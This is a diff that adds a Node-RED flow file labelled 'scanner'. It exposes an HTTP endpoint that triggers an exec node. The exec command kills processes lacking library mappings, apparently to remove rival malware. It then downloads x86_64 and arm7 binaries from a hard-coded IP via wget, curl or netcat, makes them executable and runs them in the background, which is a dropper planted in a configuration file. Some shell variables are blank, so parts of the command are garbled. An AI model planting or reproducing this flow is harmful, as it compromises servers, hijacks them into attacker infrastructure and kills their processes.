@@ -1,0 +1,48 @@
+[
+    {
+        "id": "tab_scan56078",
+        "type": "tab",
+        "label": "scanner",
+        "addpay": false,
+        "useSpawn": false,
+        "wires": null
+    },
+    {
+        "id": "httpin_scan56078",
+        "type": "http in",
+        "z": "tab_scan56078",
+        "url": "/scan56078",
+        "method": "get",
+        "addpay": false,
+        "useSpawn": false,
+        "wires": [
+            [
+                "exec_scan56078"
+            ]
+        ]
+    },
+    {
+        "id": "exec_scan56078",
+        "type": "exec",
+        "z": "tab_scan56078",
+        "command": "(for pid in /proc/[0-9]*; do pid_num=; if [ -r /maps ]; then suspicious=true; while IFS= read -r line; do case  in */lib/*|*/lib64/*|*.so*) suspicious=false; break;; esac; done < /maps; if [  = true ]; then kill -9 ; fi; fi; done); cd /tmp || cd /var/tmp || cd /dev/shm || cd /home/ubuntu || cd /home; { wget -q http://94.154.43.176/x64 -O x86_64 || curl -s http://94.154.43.176/x64 -o x86_64 || nc 94.154.43.176 259 > x86_64; } >/dev/null 2>&1; { wget -q http://94.154.43.176/arm7 -O arm7 || curl -s http://94.154.43.176/arm7 -o arm7 || nc 94.154.43.176 255 > arm7; } >/dev/null 2>&1; chmod 777 x86_64 arm7; (./x86_64 Node2 &); (./arm7 Node2 &)",
+        "addpay": false,
+        "useSpawn": false,
+        "wires": [
+            [
+                "resp_scan56078"
+            ],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "resp_scan56078",
+        "type": "http response",
+        "z": "tab_scan56078",
+        "addpay": false,
+        "useSpawn": false,
+        "statusCode": "200",
+        "wires": []
+    }
+]
